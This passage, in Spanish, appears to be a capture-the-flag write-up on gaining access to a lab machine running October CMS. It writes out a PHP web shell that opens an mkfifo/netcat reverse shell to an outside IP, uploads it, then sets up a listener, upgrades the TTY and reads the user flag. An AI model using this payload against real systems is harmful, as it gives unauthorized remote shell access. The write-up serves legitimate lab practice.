## Vuln exploit & Gaining Access {-}

### Ganando accesso desde October CMS {-}

Navigando en la web vemos que hay un fichero .php5 y un boton que nos lleva al fichero

decidimos crearnos un fichero `.php` y subirlo

```bash
vi shell.php5
```

```php
<?php
    system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 443 >/tmp/f");
?>
```

Nos ponemos en escucha por el puerto 443 

```bash
nc -nlvp 443
```

y subimos el archivo pulsando el boton upload y con el link que nos da October vamos a la pagina creada.
Vemos que hemos ganado accesso a la maquina victima.

```bash
whoami 

>www-data
```

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

Dandole a `cd /home` vemos que hay un usuario harry que contiene el **user.txt** y podemos ver la flag
